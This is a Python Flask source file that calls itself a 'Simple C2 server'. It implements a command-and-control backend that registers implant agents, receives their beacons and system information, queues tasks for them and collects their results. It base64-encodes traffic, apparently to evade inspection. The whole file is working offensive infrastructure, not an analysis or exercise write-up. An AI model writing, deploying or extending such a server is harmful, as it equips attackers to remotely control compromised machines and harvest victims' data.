#!/usr/bin/env python
import os
import sys
import json
import base64
import logging
from datetime import datetime
from flask import Flask, request, jsonify

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Create Flask app
app = Flask(__name__)

# In-memory database
agents = {}  # Stores agent information
tasks = {}   # Stores tasks for agents
results = {} # Stores task results

@app.route('/api/agents/register', methods=['POST'])
def register_agent():
    """Register a new agent or update existing agent"""
    try:
        data = request.get_json()
        
        # Decode data if it's encoded
        if 'data' in data:
            try:
                agent_data = json.loads(base64.b64decode(data['data']).decode())
            except:
                agent_data = data
        else:
            agent_data = data
            
        agent_id = agent_data.get('agent_id')
        if not agent_id:
            return jsonify({'status': 'error', 'message': 'Missing agent_id'}), 400
            
        # Store or update agent information
        agents[agent_id] = {
            'system_info': agent_data.get('system_info', {}),
            'last_seen': datetime.now().isoformat(),
            'tasks': [],
            'status': 'active'
        }
        
        logging.info(f"Agent registered: {agent_id}")
        return jsonify({'status': 'success', 'message': 'Agent registered successfully'})
        
    except Exception as e:
        logging.error(f"Error registering agent: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/agents/beacon', methods=['POST'])
def agent_beacon():
    """Handle agent beacon"""
    try:
        data = request.get_json()
        
        # Decode data if it's encoded
        if 'data' in data:
            try:
                beacon_data = json.loads(base64.b64decode(data['data']).decode())
            except:
                beacon_data = data
        else:
            beacon_data = data
            
        agent_id = beacon_data.get('agent_id')
        if not agent_id:
            return jsonify({'status': 'error', 'message': 'Missing agent_id'}), 400
            
        # Update agent information
        if agent_id in agents:
            agents[agent_id]['last_seen'] = datetime.now().isoformat()
            agents[agent_id]['status'] = 'active'
            if 'system_info' in beacon_data:
                agents[agent_id]['system_info'].update(beacon_data['system_info'])
                
            logging.info(f"Agent beacon received: {agent_id}")
            return jsonify({'status': 'success', 'message': 'Beacon acknowledged'})
        else:
            logging.warning(f"Beacon from unknown agent: {agent_id}")
            return jsonify({'status': 'error', 'message': 'Unknown agent'}), 404
            
    except Exception as e:
        logging.error(f"Error processing beacon: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tasks/<agent_id>', methods=['GET'])
def get_agent_tasks(agent_id):
    """Get pending tasks for an agent"""
    try:
        if agent_id not in agents:
            return jsonify({'status': 'error', 'message': 'Unknown agent'}), 404
            
        # Get pending tasks for this agent
        agent_tasks = []
        for task_id, task in tasks.items():
            if task['agent_id'] == agent_id and task['status'] == 'pending':
                agent_tasks.append({
                    'task_id': task_id,
                    'type': task['type'],
                    'data': task['data']
                })
                
        # Encode response
        response = {
            'status': 'success',
            'tasks': agent_tasks
        }
        
        encoded_data = base64.b64encode(json.dumps(response).encode()).decode()
        return jsonify({'data': encoded_data})
        
    except Exception as e:
        logging.error(f"Error getting tasks: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tasks', methods=['POST'])
def create_task():
    """Create a new task for an agent"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        task_type = data.get('type')
        task_data = data.get('data', {})
        
        if not agent_id or not task_type:
            return jsonify({'status': 'error', 'message': 'Missing required fields'}), 400
            
        if agent_id not in agents:
            return jsonify({'status': 'error', 'message': 'Unknown agent'}), 404
            
        # Create task
        task_id = f"task_{len(tasks) + 1}_{datetime.now().strftime('%Y%m%d%H%M%S')}"
        tasks[task_id] = {
            'agent_id': agent_id,
            'type': task_type,
            'data': task_data,
            'status': 'pending',
            'created': datetime.now().isoformat()
        }
        
        # Add task to agent's task list
        agents[agent_id]['tasks'].append(task_id)
        
        logging.info(f"Task created: {task_id} for agent {agent_id}")
        return jsonify({'status': 'success', 'task_id': task_id})
        
    except Exception as e:
        logging.error(f"Error creating task: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/results', methods=['POST'])
def receive_results():
    """Receive task results from an agent"""
    try:
        data = request.get_json()
        
        # Decode data if it's encoded
        if 'data' in data:
            try:
                result_data = json.loads(base64.b64decode(data['data']).decode())
            except:
                result_data = data
        else:
            result_data = data
            
        task_id = result_data.get('task_id')
        agent_id = result_data.get('agent_id')
        status = result_data.get('status')
        result = result_data.get('result', {})
        
        if not task_id or not agent_id:
            return jsonify({'status': 'error', 'message': 'Missing required fields'}), 400
            
        # Update task status
        if task_id in tasks:
            tasks[task_id]['status'] = status
            tasks[task_id]['completed'] = datetime.now().isoformat()
            
            # Store result
            results[task_id] = {
                'agent_id': agent_id,
                'task_id': task_id,
                'status': status,
                'result': result,
                'timestamp': datetime.now().isoformat()
            }
            
            logging.info(f"Result received for task {task_id} from agent {agent_id}")
            return jsonify({'status': 'success', 'message': 'Result received'})
        else:
            logging.warning(f"Result for unknown task: {task_id}")
            return jsonify({'status': 'error', 'message': 'Unknown task'}), 404
            
    except Exception as e:
        logging.error(f"Error processing result: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/agents', methods=['GET'])
def get_agents():
    """Get list of all agents"""
    try:
        agent_list = []
        for agent_id, agent in agents.items():
            agent_list.append({
                'agent_id': agent_id,
                'system_info': agent['system_info'],
                'last_seen': agent['last_seen'],
                'status': agent['status']
            })
            
        return jsonify({'status': 'success', 'agents': agent_list})
        
    except Exception as e:
        logging.error(f"Error getting agents: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == "__main__":
    # Set up server
    host = '0.0.0.0'  # Bind to all interfaces
    port = int(os.environ.get('PORT', 5001))
    
    print(f"Starting Simple C2 server on {host}:{port}")
    app.run(host=host, port=port, debug=True) 